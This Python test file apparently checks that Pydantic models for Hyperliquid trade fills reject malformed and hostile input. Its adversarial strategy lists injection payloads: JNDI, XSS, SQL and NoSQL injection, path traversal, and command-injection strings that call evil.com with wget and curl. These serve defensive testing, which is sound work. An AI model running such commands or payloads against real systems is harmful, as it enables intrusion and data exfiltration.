"""Property-based tests for Hyperliquid raw user fills models.

These tests validate critical security boundary models that process external user fill data.
The models tested here are essential for trade execution tracking, fee calculation, and position management.

SECURITY CRITICAL: These raw models protect against:
- Malicious fill data that could manipulate P&L calculations
- Financial precision errors in fill prices and sizes
- Buffer overflow attacks through oversized fill lists
- Injection attacks through malformed transaction hashes
- Trade ID manipulation that could affect audit trails
- Position tracking corruption through invalid start positions
- Fee manipulation that could affect cost calculations

Property testing ensures comprehensive coverage of fill edge cases and adversarial inputs.
"""

import json
import string
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.apis.hyperliquid.models.hl_raw_user_fills import (
    HyperliquidRawUserFill,
    HyperliquidRawUserFillsRequestPayload,
    HyperliquidRawUserFillsResponse,
)
from cyberdelta.exceptions.parsing import EmptyStringError, ParsingError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR USER FILLS MODEL TESTING
# =============================================================================


def decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for prices and amounts."""
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0"),  # Zero
        st.just("0.01"),  # Small amount
        st.just("1.0"),  # Unit amount
        st.just("100.0"),  # Standard amount
        st.just("1234.56"),  # Common format
        st.just("50000.123456"),  # High-precision
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        # Negative values (valid for some fields like fees - rebates)
        st.just("-0.001"),
        st.just("-1.5"),
    ])


def positive_decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid positive decimal strings."""
    return st.one_of([
        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        st.just("0"),
        st.just("0.01"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1234.56"),
        st.just("50000.123456"),
    ])


def trade_id_strategy() -> SearchStrategy[int]:
    """Generate valid trade IDs."""
    return st.integers(min_value=0, max_value=2**63 - 1)


def coin_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid coin symbols."""
    return st.one_of([
        st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_/"
            ),
        ),
        # Special symbols with emojis and unicode
        st.just("ETH 💎"),
        st.just("BTC-PERP"),
        st.just("SOL/USDC"),
    ])


def side_strategy() -> SearchStrategy[str]:
    """Generate valid order side values."""
    return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask


def direction_strategy() -> SearchStrategy[str]:
    """Generate valid direction values."""
    return st.one_of([
        st.sampled_from(["Buy", "Sell", "long", "short"]),
        st.text(min_size=1, max_size=64),  # Direction is a string field
    ])


def hash_strategy() -> SearchStrategy[str]:
    """Generate valid transaction hash strings."""
    return st.one_of([
        # Standard hex hashes
        st.text(alphabet="0123456789abcdef", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
        st.text(alphabet="0123456789ABCDEF", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
        # Shorter hashes (some systems use different lengths)
        st.text(alphabet="0123456789abcdef", min_size=32, max_size=32).map(lambda x: f"0x{x}"),
        # Max length (66 chars including 0x)
        st.text(alphabet="0123456789abcdef", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
    ])


def client_order_id_strategy() -> SearchStrategy[str | None]:
    """Generate valid client order ID strings."""
    return st.one_of([
        st.none(),  # Optional field
        st.text(
            min_size=1,
            max_size=128,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ),
        st.just("client-1"),
        st.just("order_12345"),
        st.just("test-order-001"),
    ])


def eth_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum address strings."""
    return st.one_of([
        # Standard Ethereum addresses
        st.just("0xabcdefabcdefabcdefabcdefabcdefabcdefabcd"),
        st.just("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1"),
        st.just("0x0000000000000000000000000000000000000000"),  # Zero address
        st.just("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"),  # Max address
        # Generate random valid addresses
        st.text(
            alphabet=string.hexdigits,
            min_size=40,
            max_size=40,
        ).map(lambda x: f"0x{x}"),
    ])


@st.composite
def valid_user_fill_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid user fill data."""
    return {
        "tid": draw(trade_id_strategy()),
        "coin": draw(coin_symbol_strategy()),
        "px": draw(decimal_str_strategy()),
        "sz": draw(positive_decimal_str_strategy()),
        "time": draw(st.integers(min_value=0, max_value=2**63 - 1)),
        "side": draw(side_strategy()),
        "oid": draw(trade_id_strategy()),
        "startPosition": draw(decimal_str_strategy()),
        "dir": draw(direction_strategy()),
        "hash": draw(hash_strategy()),
        "fee": draw(decimal_str_strategy()),  # Can be negative (rebates)
        "isMaker": draw(st.booleans()),
        "liquidationMarkPx": draw(st.one_of([st.none(), decimal_str_strategy()])),
        "cloid": draw(client_order_id_strategy()),
    }


@st.composite
def valid_user_fills_request_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid user fills request payload data."""
    return {
        "type": "userFills",
        "user": draw(eth_address_strategy()),
    }


def malicious_fills_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for fills security testing."""
    return st.one_of([
        # Fill manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-fills}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('fills-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE fills;--"),
        st.just("1' UNION SELECT * FROM trades--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("F" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.fills.find(); //"),
        # JSON injection
        st.just('{"$where": "this.px > 1000000"}'),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER FILL MODEL
# =============================================================================


class TestHyperliquidRawUserFillProperties:
    """Property-based tests for user fill validation and security."""

    @given(fill_data=valid_user_fill_data())
    def test_user_fill_validation_success_properties(self, fill_data: dict[str, Any]) -> None:
        """Property: Valid user fill data should always create valid fill objects."""
        # Skip invalid data
        assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
        assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
        assume(isinstance(fill_data["time"], int) and fill_data["time"] >= 0)
        assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
        assume(len(fill_data["coin"].encode("utf-8")) <= 64)
        assume(isinstance(fill_data["dir"], str) and fill_data["dir"].strip())
        assume(isinstance(fill_data["hash"], str) and fill_data["hash"].strip())
        assume(len(fill_data["hash"].encode("utf-8")) <= 66)
        assume(fill_data["side"] in ["B", "S", "A"])
        assume(isinstance(fill_data["isMaker"], bool))

        # Validate decimals
        for field in ["px", "sz", "fee", "startPosition"]:
            value = fill_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
                if field == "sz":
                    assume(decimal_val >= 0)
            except (ValueError, TypeError):
                assume(False)

        # Validate optional liquidationMarkPx
        if fill_data["liquidationMarkPx"] is not None:
            value = fill_data["liquidationMarkPx"]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        # Validate optional cloid
        if fill_data["cloid"] is not None:
            assume(isinstance(fill_data["cloid"], str) and fill_data["cloid"].strip())
            assume(len(fill_data["cloid"].encode("utf-8")) <= 128)

        obj = HyperliquidRawUserFill.model_validate(fill_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserFill)

        # Property: Fields should be preserved (with normalization)
        assert obj.tid == fill_data["tid"]
        assert obj.coin == fill_data["coin"]
        assert Decimal(obj.px) == Decimal(fill_data["px"])
        assert Decimal(obj.sz) == Decimal(fill_data["sz"])
        assert obj.time == fill_data["time"]
        assert obj.side == fill_data["side"]
        assert obj.oid == fill_data["oid"]
        assert Decimal(obj.start_position) == Decimal(fill_data["startPosition"])
        assert obj.dir == fill_data["dir"]
        assert obj.hash == fill_data["hash"]
        assert Decimal(obj.fee) == Decimal(fill_data["fee"])
        assert obj.is_maker == fill_data["isMaker"]

        if fill_data["liquidationMarkPx"] is not None:
            assert obj.liquidation_mark_px is not None
            assert Decimal(obj.liquidation_mark_px) == Decimal(fill_data["liquidationMarkPx"])
        else:
            assert obj.liquidation_mark_px is None

        assert obj.cloid == fill_data["cloid"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from([
            "tid",
            "coin",
            "px",
            "sz",
            "time",
            "side",
            "oid",
            "startPosition",
            "dir",
            "hash",
            "fee",
            "isMaker",
        ]),
        malicious_value=malicious_fills_strategy(),
    )
    def test_user_fill_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: User fill should reject malicious inputs safely."""
        base_data = {
            "tid": 1,
            "coin": "ETH",
            "px": "100.0",
            "sz": "1.0",
            "time": 1234567890,
            "side": "B",
            "oid": 2,
            "startPosition": "0.0",
            "dir": "long",
            "hash": "0x" + "a" * 64,
            "fee": "0.01",
            "isMaker": True,
            "liquidationMarkPx": None,
            "cloid": None,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            ParsingError,
        )):
            HyperliquidRawUserFill.model_validate(base_data)

    @given(invalid_tid=st.integers(min_value=-1000, max_value=-1))
    def test_user_fill_negative_tid_properties(self, invalid_tid: int) -> None:
        """Property: User fill should reject negative trade IDs."""
        fill_data = {
            "tid": invalid_tid,
            "coin": "ETH",
            "px": "100.0",
            "sz": "1.0",
            "time": 1234567890,
            "side": "B",
            "oid": 2,
            "startPosition": "0.0",
            "dir": "long",
            "hash": "0x" + "a" * 64,
            "fee": "0.01",
            "isMaker": True,
            "liquidationMarkPx": None,
            "cloid": None,
        }

        # Property: Negative TIDs should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserFill.model_validate(fill_data)

    @given(invalid_side=st.text().filter(lambda x: x not in ["B", "S", "A"]))
    def test_user_fill_invalid_side_properties(self, invalid_side: str) -> None:
        """Property: User fill should validate side values strictly."""
        assume(invalid_side.strip())  # Skip empty strings

        fill_data = {
            "tid": 1,
            "coin": "ETH",
            "px": "100.0",
            "sz": "1.0",
            "time": 1234567890,
            "side": invalid_side,
            "oid": 2,
            "startPosition": "0.0",
            "dir": "long",
            "hash": "0x" + "a" * 64,
            "fee": "0.01",
            "isMaker": True,
            "liquidationMarkPx": None,
            "cloid": None,
        }

        # Property: Invalid side values should be rejected
        with pytest.raises((ValidationError, EmptyStringError)):
            HyperliquidRawUserFill.model_validate(fill_data)

    @given(
        invalid_hash=st.one_of([
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
            st.just("not_a_hash"),  # Invalid format
            st.text(min_size=67, max_size=100),  # Too long (max is 66)
            st.just("0x"),  # Too short
            st.just("0x" + "G" * 64),  # Invalid hex chars
        ])
    )
    def test_user_fill_invalid_hash_properties(self, invalid_hash: str) -> None:
        """Property: User fill should validate hash format."""
        fill_data = {
            "tid": 1,
            "coin": "ETH",
            "px": "100.0",
            "sz": "1.0",
            "time": 1234567890,
            "side": "B",
            "oid": 2,
            "startPosition": "0.0",
            "dir": "long",
            "hash": invalid_hash,
            "fee": "0.01",
            "isMaker": True,
            "liquidationMarkPx": None,
            "cloid": None,
        }

        # Property: Invalid hashes should be rejected
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawUserFill.model_validate(fill_data)

    @given(
        invalid_px=st.one_of([
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
            st.just("NaN"),  # Not a number
            st.just("inf"),  # Infinity
            st.just("-inf"),  # Negative infinity
            st.just("Infinity"),
            st.just("not_a_number"),
        ])
    )
    def test_user_fill_invalid_price_properties(self, invalid_px: str) -> None:
        """Property: User fill should validate price constraints."""
        fill_data = {
            "tid": 1,
            "coin": "ETH",
            "px": invalid_px,
            "sz": "1.0",
            "time": 1234567890,
            "side": "B",
            "oid": 2,
            "startPosition": "0.0",
            "dir": "long",
            "hash": "0x" + "a" * 64,
            "fee": "0.01",
            "isMaker": True,
            "liquidationMarkPx": None,
            "cloid": None,
        }

        try:
            # Check if the price can be parsed as a finite decimal
            decimal_val = Decimal(invalid_px.strip() if invalid_px else "")
            is_finite = decimal_val.is_finite()
            is_empty = not invalid_px.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawUserFill.model_validate(fill_data)
                assert Decimal(obj.px) == decimal_val
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, ParsingError)):
                    HyperliquidRawUserFill.model_validate(fill_data)

        except (ValueError, TypeError):
            # Property: Unparseable price strings should be rejected
            with pytest.raises((ValidationError, EmptyStringError, ParsingError)):
                HyperliquidRawUserFill.model_validate(fill_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_user_fill_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: User fill should forbid extra fields."""
        fill_data = {
            "tid": 1,
            "coin": "ETH",
            "px": "100.0",
            "sz": "1.0",
            "time": 1234567890,
            "side": "B",
            "oid": 2,
            "startPosition": "0.0",
            "dir": "long",
            "hash": "0x" + "a" * 64,
            "fee": "0.01",
            "isMaker": True,
            "liquidationMarkPx": None,
            "cloid": None,
        }
        fill_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawUserFill.model_validate(fill_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER FILLS RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawUserFillsResponseProperties:
    """Property-based tests for user fills response validation and security."""

    @given(fills=st.lists(valid_user_fill_data(), min_size=0, max_size=100))
    def test_user_fills_response_validation_success_properties(
        self, fills: list[dict[str, Any]]
    ) -> None:
        """Property: Valid fills list should always create valid response objects."""
        valid_fills = []

        for fill_data in fills:
            try:
                # Validate all required fields
                assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
                assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
                assume(isinstance(fill_data["time"], int) and fill_data["time"] >= 0)
                assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
                assume(len(fill_data["coin"].encode("utf-8")) <= 64)
                assume(isinstance(fill_data["dir"], str) and fill_data["dir"].strip())
                assume(isinstance(fill_data["hash"], str) and fill_data["hash"].strip())
                assume(len(fill_data["hash"].encode("utf-8")) <= 66)
                assume(fill_data["side"] in ["B", "S", "A"])
                assume(isinstance(fill_data["isMaker"], bool))

                # Validate decimals
                for field in ["px", "sz", "fee", "startPosition"]:
                    value = fill_data[field]
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite())
                    if field == "sz":
                        assume(decimal_val >= 0)

                # Validate optional fields
                if fill_data["liquidationMarkPx"] is not None:
                    value = fill_data["liquidationMarkPx"]
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value.strip())
                    assume(decimal_val.is_finite())

                if fill_data["cloid"] is not None:
                    assume(isinstance(fill_data["cloid"], str) and fill_data["cloid"].strip())
                    assume(len(fill_data["cloid"].encode("utf-8")) <= 128)

                valid_fills.append(fill_data)
            except (ValueError, TypeError):
                pass  # Skip invalid fills

        obj = HyperliquidRawUserFillsResponse.model_validate(valid_fills)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserFillsResponse)
        assert isinstance(obj.root, list)
        assert len(obj.root) == len(valid_fills)

        # Property: All fills should be properly typed
        for fill in obj.root:
            assert isinstance(fill, HyperliquidRawUserFill)

    @given(
        invalid_root=st.one_of([
            st.dictionaries(st.text(), st.text()),  # Dict instead of list
            st.text(),  # String instead of list
            st.integers(),  # Integer instead of list
            st.floats(),  # Float instead of list
            st.booleans(),  # Boolean instead of list
            st.none(),  # None instead of list
        ])
    )
    def test_user_fills_response_type_validation_properties(self, invalid_root: Any) -> None:
        """Property: User fills response should reject non-list inputs."""
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawUserFillsResponse.model_validate(invalid_root)

    def test_user_fills_response_empty_list_properties(self) -> None:
        """Property: Empty fills list should be valid."""
        obj = HyperliquidRawUserFillsResponse.model_validate([])
        assert obj.root == []


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER FILLS REQUEST PAYLOAD MODEL
# =============================================================================


class TestHyperliquidRawUserFillsRequestPayloadProperties:
    """Property-based tests for user fills request payload validation and security."""

    @given(request_data=valid_user_fills_request_data())
    def test_user_fills_request_validation_success_properties(
        self, request_data: dict[str, str]
    ) -> None:
        """Property: Valid request data should always create valid request objects."""
        # Validate user address
        user = request_data["user"]
        assume(isinstance(user, str) and user.startswith("0x"))
        assume(len(user) == 42)  # 0x + 40 hex chars
        assume(all(c in string.hexdigits for c in user[2:]))

        obj = HyperliquidRawUserFillsRequestPayload.model_validate(request_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserFillsRequestPayload)
        assert obj.type == "userFills"
        assert obj.user == request_data["user"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        invalid_user=st.one_of([
            st.just("0x123"),  # Too short
            st.just("notanaddress"),  # No 0x prefix
            st.just("0x" + "G" * 40),  # Invalid hex chars
            st.text(min_size=43, max_size=100),  # Too long
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
        ])
    )
    def test_user_fills_request_invalid_user_properties(self, invalid_user: str) -> None:
        """Property: User fills request should validate user address format."""
        request_data = {
            "type": "userFills",
            "user": invalid_user,
        }

        # Property: Invalid user addresses should be rejected
        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
            HyperliquidRawUserFillsRequestPayload.model_validate(request_data)

    @given(invalid_type=st.text().filter(lambda x: x != "userFills"))
    def test_user_fills_request_invalid_type_properties(self, invalid_type: str) -> None:
        """Property: User fills request should only accept 'userFills' as type."""
        assume(invalid_type.strip())  # Skip empty strings

        request_data = {
            "type": invalid_type,
            "user": "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
        }

        # Property: Invalid type values should be rejected
        with pytest.raises((ValidationError, EmptyStringError)):
            HyperliquidRawUserFillsRequestPayload.model_validate(request_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawUserFillsIntegrationProperties:
    """Integration property tests for user fills models working together."""

    @given(
        fill_data=valid_user_fill_data(),
        malicious_entries=st.dictionaries(
            malicious_fills_strategy(),
            malicious_fills_strategy(),
            min_size=1,
            max_size=3,
        ),
    )
    def test_user_fills_adversarial_input_properties(
        self, fill_data: dict[str, Any], malicious_entries: dict[Any, Any]
    ) -> None:
        """Property: User fills models should safely handle adversarial input."""
        # Mix valid and malicious data
        mixed_data = {**fill_data, **malicious_entries}

        # Property: Mixed adversarial input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            TypeFieldError,
            EmptyStringError,
            ParsingError,
        )):
            HyperliquidRawUserFill.model_validate(mixed_data)

    @given(fill_data=valid_user_fill_data())
    def test_user_fill_json_serialization_properties(self, fill_data: dict[str, Any]) -> None:
        """Property: User fill should maintain JSON serialization compatibility."""
        # Skip invalid data
        try:
            assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
            assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
            assume(isinstance(fill_data["time"], int) and fill_data["time"] >= 0)
            assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
            assume(len(fill_data["coin"].encode("utf-8")) <= 64)
            assume(isinstance(fill_data["dir"], str) and fill_data["dir"].strip())
            assume(isinstance(fill_data["hash"], str) and fill_data["hash"].strip())
            assume(len(fill_data["hash"].encode("utf-8")) <= 66)
            assume(fill_data["side"] in ["B", "S", "A"])
            assume(isinstance(fill_data["isMaker"], bool))

            # Validate decimals
            for field in ["px", "sz", "fee", "startPosition"]:
                value = fill_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
                if field == "sz":
                    assume(decimal_val >= 0)

            # Validate optional fields
            if fill_data["liquidationMarkPx"] is not None:
                value = fill_data["liquidationMarkPx"]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())

            if fill_data["cloid"] is not None:
                assume(isinstance(fill_data["cloid"], str) and fill_data["cloid"].strip())
                assume(len(fill_data["cloid"].encode("utf-8")) <= 128)
        except (ValueError, TypeError):
            assume(False)

        obj = HyperliquidRawUserFill.model_validate(fill_data)
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        # Property: Should be able to reconstruct from JSON
        reconstructed = HyperliquidRawUserFill.model_validate(parsed_json)
        assert reconstructed.tid == obj.tid
        assert reconstructed.coin == obj.coin
        assert Decimal(reconstructed.px) == Decimal(obj.px)
        assert Decimal(reconstructed.sz) == Decimal(obj.sz)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawUserFill_real_world_example() -> None:
    """Test with real-world user fill data."""
    payload = {
        "tid": 123456789,
        "coin": "ETH",
        "px": "2000.50",
        "sz": "0.1",
        "time": 1678886400123,
        "side": "B",
        "oid": 987654321,
        "startPosition": "1.0",
        "dir": "Buy",
        "hash": "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef123456",
        "fee": "0.002",
        "isMaker": False,
        "liquidationMarkPx": None,
        "cloid": None,
    }
    obj = HyperliquidRawUserFill.model_validate(payload)
    assert obj.tid == 123456789
    assert obj.coin == "ETH"
    assert obj.px == "2000.5"  # Normalized
    assert obj.sz == "0.1"
    assert obj.is_maker is False


def test_HyperliquidRawUserFill_with_liquidation() -> None:
    """Test with liquidation mark price."""
    payload = {
        "tid": 1,
        "coin": "BTC",
        "px": "30000.00",
        "sz": "1.0",
        "time": 1234567890,
        "side": "S",
        "oid": 2,
        "startPosition": "5.0",
        "dir": "short",
        "hash": "0x" + "a" * 64,
        "fee": "15.00",
        "isMaker": True,
        "liquidationMarkPx": "29500.00",
        "cloid": "liquidation-001",
    }
    obj = HyperliquidRawUserFill.model_validate(payload)
    assert obj.liquidation_mark_px == "29500"  # Normalized
    assert obj.cloid == "liquidation-001"


def test_HyperliquidRawUserFill_negative_fee() -> None:
    """Test with negative fee (rebate)."""
    payload = {
        "tid": 1,
        "coin": "SOL",
        "px": "100.00",
        "sz": "10.0",
        "time": 1234567890,
        "side": "B",
        "oid": 2,
        "startPosition": "0.0",
        "dir": "long",
        "hash": "0x" + "b" * 64,
        "fee": "-0.05",  # Rebate
        "isMaker": True,
        "liquidationMarkPx": None,
        "cloid": None,
    }
    obj = HyperliquidRawUserFill.model_validate(payload)
    assert obj.fee == "-0.05"


def test_HyperliquidRawUserFillsResponse_multiple_fills() -> None:
    """Test response with multiple fills."""
    fills = [
        {
            "tid": i,
            "coin": f"COIN{i}",
            "px": str(100 + i),
            "sz": "1.0",
            "time": 1234567890 + i,
            "side": "B" if i % 2 == 0 else "S",
            "oid": 100 + i,
            "startPosition": "0.0",
            "dir": "long" if i % 2 == 0 else "short",
            "hash": f"0x{'a' * 63}{i}",
            "fee": "0.01",
            "isMaker": i % 2 == 0,
            "liquidationMarkPx": None,
            "cloid": None,
        }
        for i in range(5)
    ]
    obj = HyperliquidRawUserFillsResponse.model_validate(fills)
    assert len(obj.root) == 5
    assert obj.root[0].tid == 0
    assert obj.root[4].tid == 4


def test_HyperliquidRawUserFillsRequestPayload_real_world() -> None:
    """Test with real-world request payload."""
    payload = {
        "type": "userFills",
        "user": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1",
    }
    obj = HyperliquidRawUserFillsRequestPayload.model_validate(payload)
    assert obj.type == "userFills"
    assert obj.user == "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1"
